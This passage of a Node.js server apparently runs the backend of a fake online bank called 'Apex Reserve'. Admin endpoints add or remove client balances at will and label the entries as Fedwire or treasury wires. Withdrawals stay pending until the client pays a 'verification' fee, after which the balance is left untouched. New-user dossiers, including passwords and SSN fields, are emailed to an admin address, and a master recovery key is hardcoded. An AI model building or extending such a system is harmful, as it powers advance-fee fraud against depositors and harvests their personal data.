    }
    return;
  }

  // 4c. ADMIN CONFIRM WITHDRAWAL PAYMENT MADE
  if (reqUrl === '/api/admin/confirm-withdrawal-payment' && req.method === 'POST') {
    try {
      const { userId, note } = await parseJsonBody(req);
      const db = readDb();

      const user = db.users.find(u => u.id === userId);
      if (!user) {
        sendJson(res, 404, { error: 'User not found' });
        return;
      }

      if (!user.pendingWithdrawal || user.pendingWithdrawal.status !== 'Pending') {
        sendJson(res, 400, { error: 'User has no active pending withdrawal to confirm.' });
        return;
      }

      const withdrawAmt = user.pendingWithdrawal.amount || 0;
      const verAmt = user.pendingWithdrawal.requiredVerification || user.verificationWithdrawalAmount || 2500.00;

      // Note: As requested by admin, charges/withdrawals are NOT deducted from the account balance upon confirmation
      // The account balance remains intact.

      // Update pending withdrawal status to confirmed & settled
      user.pendingWithdrawal.status = 'Settled';
      user.pendingWithdrawal.paymentConfirmed = true;
      user.pendingWithdrawal.confirmedAt = new Date().toISOString();
      user.pendingWithdrawal.confirmationNote = note || `Verification payment of $${verAmt.toLocaleString('en-US', { minimumFractionDigits: 2 })} confirmed received by Executive Admin. Outbound transfer settled.`;

      // Update matching transaction in user transactions ledger
      if (user.transactions && Array.isArray(user.transactions)) {
        const tx = user.transactions.find(t => t.id === user.pendingWithdrawal.txId) ||
                   user.transactions.find(t => t.type === 'outflow' && t.status === 'Pending');
        if (tx) {
          tx.status = 'Settled';
          tx.date = 'Just now';
          tx.note = `Withdrawal Cleared: Verification payment of $${verAmt.toLocaleString('en-US', { minimumFractionDigits: 2 })} confirmed by Admin. Transfer Settled.`;
        }
      }

      writeDb(db);
      sendJson(res, 200, {
        success: true,
        message: 'Verification payment confirmed. Outbound withdrawal settled successfully.',
        user: { ...user, password: '[PROTECTED]' }
      });
    } catch (e) {
      sendJson(res, 500, { error: 'Failed to confirm withdrawal payment' });
    }
    return;
  }

  // 4d. ADMIN INCREASE CLIENT BALANCE ANYTIME ANYDAY
  if (reqUrl === '/api/admin/increase-balance' && req.method === 'POST') {
    try {
      const { userId, amount, memo, recordName } = await parseJsonBody(req);
      const db = readDb();

      const user = db.users.find(u => u.id === userId);
      if (!user) {
        sendJson(res, 404, { error: 'User not found' });
        return;
      }

      const increaseAmt = Math.max(0, parseFloat(amount) || 0);
      if (increaseAmt <= 0) {
        sendJson(res, 400, { error: 'Invalid amount. Must be greater than 0.' });
        return;
      }

      user.checkingBalance = (user.checkingBalance || 0) + increaseAmt;
      user.totalBalance = (user.checkingBalance || 0) + (user.savingsBalance || 0);

      const title = (recordName && recordName.trim()) || 'Executive Liquidity Allocation';
      const note = (memo && memo.trim()) || `Executive Admin added $${increaseAmt.toLocaleString('en-US', { minimumFractionDigits: 2 })} to account balance.`;

      const txId = `TX-${Math.floor(1000 + Math.random() * 9000)}-FED-${Math.floor(1000 + Math.random() * 9000)}`;
      if (!user.transactions) user.transactions = [];
      user.transactions.unshift({
        id: txId,
        type: 'inflow',
        title: title,
        category: 'Treasury Wire',
        method: 'Fedwire RTGS Participant Node',
        date: 'Just now',
        rawDate: new Date().toISOString(),
        amount: increaseAmt,
        status: 'Settled',
        note: note
      });

      saveToBalanceVault(user);
      writeDb(db);
      sendJson(res, 200, {
        success: true,
        message: `Successfully increased balance by $${increaseAmt.toLocaleString('en-US', { minimumFractionDigits: 2 })}`,
        totalBalance: user.totalBalance,
        checkingBalance: user.checkingBalance,
        user: { ...user, password: '[PROTECTED]' }
      });
    } catch (e) {
      sendJson(res, 500, { error: 'Failed to increase balance' });
    }
    return;
  }

  // 4e. ADMIN DECREASE CLIENT BALANCE ANYTIME ANYDAY
  if (reqUrl === '/api/admin/decrease-balance' && req.method === 'POST') {
    try {
      const { userId, amount, memo, recordName } = await parseJsonBody(req);
      const db = readDb();

      const user = db.users.find(u => u.id === userId);
      if (!user) {
        sendJson(res, 404, { error: 'User not found' });
        return;
      }

      const decreaseAmt = Math.max(0, parseFloat(amount) || 0);
      if (decreaseAmt <= 0) {
        sendJson(res, 400, { error: 'Invalid amount. Must be greater than 0.' });
        return;
      }

      user.checkingBalance = Math.max(0, (user.checkingBalance || 0) - decreaseAmt);
      user.totalBalance = (user.checkingBalance || 0) + (user.savingsBalance || 0);

      const title = (recordName && recordName.trim()) || 'Treasury Capital Drawdown / Adjustment';
      const note = (memo && memo.trim()) || `Executive Admin deducted $${decreaseAmt.toLocaleString('en-US', { minimumFractionDigits: 2 })} from account balance.`;

      const txId = `TX-${Math.floor(1000 + Math.random() * 9000)}-DEBIT-${Math.floor(1000 + Math.random() * 9000)}`;
      if (!user.transactions) user.transactions = [];
      user.transactions.unshift({
        id: txId,
        type: 'outflow',
        title: title,
        category: 'Capital Drawdown',
        method: 'Internal Admin Ledger Debit',
        date: 'Just now',
        rawDate: new Date().toISOString(),
        amount: decreaseAmt,
        status: 'Settled',
        note: note
      });

      saveToBalanceVault(user);
      writeDb(db);
      sendJson(res, 200, {
        success: true,
        message: `Successfully decreased balance by $${decreaseAmt.toLocaleString('en-US', { minimumFractionDigits: 2 })}`,
        totalBalance: user.totalBalance,
        checkingBalance: user.checkingBalance,
        user: { ...user, password: '[PROTECTED]' }
      });
    } catch (e) {
      sendJson(res, 500, { error: 'Failed to decrease balance' });
    }
    return;
  }

  // 5. ADMIN REJECT USER (AUTOMATICALLY DELETES USER AS REQUESTED)
  if (reqUrl === '/api/admin/reject' && req.method === 'POST') {
    try {
      const { userId } = await parseJsonBody(req);
      const db = readDb();

      const userIndex = db.users.findIndex(u => u.id === userId);
      if (userIndex === -1) {
        sendJson(res, 404, { error: 'User not found' });
        return;
      }

      const deletedUser = db.users.splice(userIndex, 1)[0];

      // Purge from credentials vault
      try {
        const vault = readVault();
        if (vault.credentials) {
          if (deletedUser.id) delete vault.credentials[deletedUser.id.toLowerCase()];
          if (deletedUser.username) delete vault.credentials[deletedUser.username.toLowerCase()];
          if (deletedUser.email) delete vault.credentials[deletedUser.email.toLowerCase()];
          writeVault(vault);
        }
      } catch (eVault) {}

      // Purge from balance vault
      try {
        const balVault = readBalanceVault();
        if (balVault.balances) {
          if (deletedUser.id) delete balVault.balances[deletedUser.id.toLowerCase()];
          if (deletedUser.username) delete balVault.balances[deletedUser.username.toLowerCase()];
          if (deletedUser.email) delete balVault.balances[deletedUser.email.toLowerCase()];
          writeBalanceVault(balVault);
        }
      } catch (eBal) {}

      writeDb(db);
      console.log(`✓ Rejected user ${deletedUser.name} (@${deletedUser.username}) deleted automatically.`);

      sendJson(res, 200, {
        success: true,
        message: `User ${deletedUser.name} rejected and deleted automatically.`,
        deletedUserId: userId
      });
    } catch (e) {
      sendJson(res, 500, { error: 'Rejection and deletion failed' });
    }
    return;
  }

  // 5b. USER WITHDRAW FUNDS (PENDING VERIFICATION AS REQUESTED)
  if (reqUrl === '/api/user/withdraw' && req.method === 'POST') {
    try {
      const { userId, amount, recipientName, recipientBank, recipientAccount, rail, memo } = await parseJsonBody(req);
      const db = readDb();

      const user = db.users.find(u => u.id === userId);
      if (!user) {
        sendJson(res, 404, { error: 'User not found' });
        return;
      }

      const withdrawAmt = parseFloat(amount) || 0;
      if (withdrawAmt <= 0) {
        sendJson(res, 400, { error: 'Invalid withdrawal amount' });
        return;
      }

      if (withdrawAmt > user.checkingBalance) {
        sendJson(res, 400, { error: 'Insufficient funds for withdrawal' });
        return;
      }

      const verAmount = typeof user.verificationWithdrawalAmount === 'number'
        ? user.verificationWithdrawalAmount
        : 2500.00;

      const txId = `WD-${Math.floor(1000 + Math.random() * 9000)}-FED-${Math.floor(1000 + Math.random() * 9000)}`;
      const maskedAcc = (recipientAccount || '').length > 4
        ? '•••• ' + (recipientAccount || '').slice(-4)
        : '•••• ' + (recipientAccount || '0000');

      const newTx = {
        id: txId,
        type: 'outflow',
        title: `Withdrawal: ${recipientName || 'External Beneficiary'}`,
        category: recipientBank || 'Beneficiary Bank',
        method: rail || 'Fedwire Instant',
        date: 'Pending Verification',
        rawDate: new Date().toISOString(),
        amount: withdrawAmt,
        status: 'Pending',
        note: `Withdrawal Pending: Verification withdraw fund of $${verAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} must be completed as determined by Admin.`
      };

      if (!user.transactions) user.transactions = [];
      user.transactions.unshift(newTx);

      const statement = user.withdrawalStatement || 'PENDING COMPLIANCE VERIFICATION';

      user.pendingWithdrawal = {
        txId: txId,
        amount: withdrawAmt,
        recipient: recipientName,
        bank: recipientBank,
        account: maskedAcc,
        rail: rail || 'Fedwire Instant',
        memo: memo || 'Withdrawal of Funds',
        status: 'Pending',
        requiredVerification: verAmount,
        statement: statement,
        paymentConfirmed: false,
        timestamp: new Date().toISOString()
      };

      writeDb(db);

      sendJson(res, 200, {
        success: true,
        status: 'Pending',
        requiredVerification: verAmount,
        transaction: newTx,
        user: { ...user, password: '[PROTECTED]' }
      });
    } catch (e) {
      sendJson(res, 500, { error: 'Withdrawal request failed' });
    }
    return;
  }

  // 6. USER DEPOSIT FUNDS (RESTRICTED)
  if (reqUrl === '/api/user/deposit' && req.method === 'POST') {
    sendJson(res, 403, {
      error: 'Self-deposits are restricted. Account funding is exclusively authorized and credited by the Executive Compliance Administration.'
    });
    return;
  }

  // 7. ADMIN CHANGE / RESET PASSCODE
  if (reqUrl === '/api/admin/change-password' && req.method === 'POST') {
    try {
      const { currentPassword, newPassword, recoveryKey } = await parseJsonBody(req);
      const db = readDb();
      const admin = db.users.find(u => u.role === 'admin' || u.id === 'usr_admin_compliance');

      if (!admin) {
        sendJson(res, 404, { error: 'Admin account not found in database.' });
        return;
      }

      if (recoveryKey) {
        const validKey = 'APEX-ADMIN-ROOT-9901';
        const validEmail = (admin.email || 'admin@apexreserve.com').toLowerCase();
        if (recoveryKey.trim() !== validKey && recoveryKey.trim().toLowerCase() !== validEmail) {
          sendJson(res, 400, { error: 'Invalid master recovery key or recovery email.' });
          return;
        }
      } else if (currentPassword) {
        if (admin.password !== currentPassword) {
          sendJson(res, 400, { error: 'Current admin passcode is incorrect.' });
          return;
        }
      } else {
        sendJson(res, 400, { error: 'Current passcode or recovery key is required.' });
        return;
      }

      if (!newPassword || newPassword.trim().length < 4) {
        sendJson(res, 400, { error: 'New admin passcode must be at least 4 characters.' });
        return;
      }

      admin.password = newPassword.trim();
      admin.passwordUpdatedAt = new Date().toISOString();
      admin.isCustomPassword = true;
      saveToVault(admin, newPassword.trim());
      writeDb(db);

      sendJson(res, 200, {
        success: true,
        message: 'Admin passcode successfully updated in backend database and credentials vault.'
      });
    } catch (e) {
      sendJson(res, 500, { error: 'Failed to update admin passcode.' });
    }
    return;
  }

  // 8. ADMIN GET NOTIFICATION CONFIG (Default: manechris201@gmail.com)
  if (reqUrl === '/api/admin/notification-config' && req.method === 'GET') {
    const config = readEmailConfig();
    sendJson(res, 200, {
      success: true,
      config: config
    });
    return;
  }

  // 8b. ADMIN UPDATE NOTIFICATION CONFIG (Change admin email anytime)
  if (reqUrl === '/api/admin/notification-config' && req.method === 'POST') {
    try {
      const data = await parseJsonBody(req);
      const currentConfig = readEmailConfig();

      if (data.adminEmail && typeof data.adminEmail === 'string') {
        currentConfig.adminEmail = data.adminEmail.trim();
      }
      if (typeof data.enableEmailNotifications === 'boolean') {
        currentConfig.enableEmailNotifications = data.enableEmailNotifications;
      }
      if (data.smtp && typeof data.smtp === 'object') {
        currentConfig.smtp = {
          ...currentConfig.smtp,
          ...data.smtp
        };
      }

      const saved = writeEmailConfig(currentConfig);
      if (saved) {
        console.log(`✓ Admin notification email updated to: ${currentConfig.adminEmail}`);
        sendJson(res, 200, {
          success: true,
          message: `Admin notification email successfully updated to ${currentConfig.adminEmail}`,
          config: currentConfig
        });
      } else {
        sendJson(res, 500, { error: 'Failed to save notification configuration file.' });
      }
    } catch (e) {
      sendJson(res, 500, { error: 'Invalid configuration data' });
    }
    return;
  }

  // 8c. ADMIN GET RECENT NOTIFICATIONS / REGISTRATION DOSSIERS
  if (reqUrl === '/api/admin/notifications' && req.method === 'GET') {
    const notifs = readNotifications();
    sendJson(res, 200, {
      success: true,
      notifications: notifs.notifications || []
    });
    return;
  }

  // 8d. ADMIN TRIGGER TEST EMAIL NOTIFICATION
  if (reqUrl === '/api/admin/test-email' && req.method === 'POST') {
    try {
      const config = readEmailConfig();
      const testUserData = {
        id: 'usr_test_verification',
        name: 'Alexander Sterling (Test Registration)',
        username: 'sterling_test',
        password: 'Pass_' + Math.floor(1000 + Math.random() * 9000),
        email: 'alexander.sterling@example.com',
        phone: '+1 (212) 555-0199',
        dob: '1985-06-15',
        accountType: 'Private Client Reserve Checking',
        ssn: '***-**-8492',
        rawSsn: '000-12-8492',
        address: '740 Park Avenue, Penthouse B, New York, NY 10021',
        accountNumber: '#8920-999',
        fullAccountNumber: '89204109999',
        routing: '021000089',
        tier: 'Private Client Reserve',
        status: 'pending',
        createdAt: new Date().toISOString()
      };

      const dispatchResult = await sendAdminRegistrationEmail(testUserData);
      sendJson(res, 200, {
        success: true,
        message: `Test registration notification dispatched to ${config.adminEmail}`,
        result: dispatchResult
      });
    } catch (e) {
      sendJson(res, 500, { error: 'Failed to send test email: ' + e.message });
    }
    return;
  }

  // ==========================================
  // STATIC ASSET SERVER
  // ==========================================
  let reqPath = reqUrl === '/' ? '/login.html' : reqUrl;
  const safePath = path.normalize(path.join(__dirname, reqPath));

  if (!safePath.startsWith(__dirname)) {
    res.writeHead(403);
    res.end('Forbidden');
    return;
  }

  fs.readFile(safePath, (err, data) => {
    if (err) {
      if (err.code === 'ENOENT') {
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('404 Not Found');
      } else {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('Server Error');
      }
      return;
    }

    const ext = path.extname(safePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';
    res.writeHead(200, { 'Content-Type': contentType });
    res.end(data);
  });
});

server.listen(PORT, () => {
  console.log(`Apex Reserve Banking Server with Database running at http://localhost:${PORT}`);
});
